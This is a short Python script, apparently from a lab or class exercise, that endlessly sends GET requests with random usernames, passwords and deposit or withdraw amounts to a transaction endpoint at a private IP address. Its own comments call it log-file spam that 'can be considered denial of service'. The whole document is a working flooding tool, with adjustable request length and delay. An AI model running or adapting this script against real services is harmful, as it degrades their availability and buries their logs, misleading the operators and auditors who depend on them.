#!/usr/bin/python

#Random curl request, the only thing changing is the length of it. Can be considered denial of service I believe
import requests
import random
import string
from time import sleep
import sys

username = ""
password = ""

beg_req = "http://10.1.5.2/process.php"

def fill_log(length):
    global username
    
    types = ["deposit", "withdraw"]
    amount = random.randint(100, 100000)
    drop = random.choice(types)
    append_rand = ''.join(random.choice(string.ascii_lowercase) for i in range(int(length)))
    temp_username = username +append_rand
    params = (
        ('user', temp_username),
        ('pass', password),
        ('drop', drop),
        ('amount', amount),
    )
    response = requests.get(beg_req, params=params)
    print(response.text)


def main():
    if len(sys.argv) != 3:
        print("Usage: python curl_request_set_length.py lengthOfRequest sleepTime")
        exit(-1)
    print(sys.argv[1])
    global username
    global password
    append_rand = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    username += append_rand
    password += append_rand
    #Spam transaction to fill log file, sleep time is adjustable
    while (1):
        fill_log(sys.argv[1])
        sleep(int(sys.argv[2]))
        
main()
